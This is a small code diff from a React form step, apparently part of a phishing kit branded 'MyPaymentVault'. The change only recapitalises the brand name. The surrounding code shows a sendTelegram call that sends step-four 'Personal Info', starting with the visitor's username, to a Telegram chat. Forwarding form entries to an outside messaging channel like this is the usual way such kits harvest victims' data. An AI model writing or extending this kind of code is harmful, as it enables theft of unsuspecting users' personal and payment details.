@@ -90,7 +90,7 @@ export default function Step4() {
 
     await sendTelegram(
       `━━━━━━━━━━━━━━━━━━━━━\n` +
-      `📋 <b>MYPAYMENTVAULT</b>\n` +
+      `📋 <b>MyPaymentVault</b>\n` +
       `📌 <b>Step 4 — Personal Info</b>\n` +
       `━━━━━━━━━━━━━━━━━━━━━\n\n` +
       `👤 <b>Username</b>    : <code>${user?.username ?? "-"}</code>\n` +
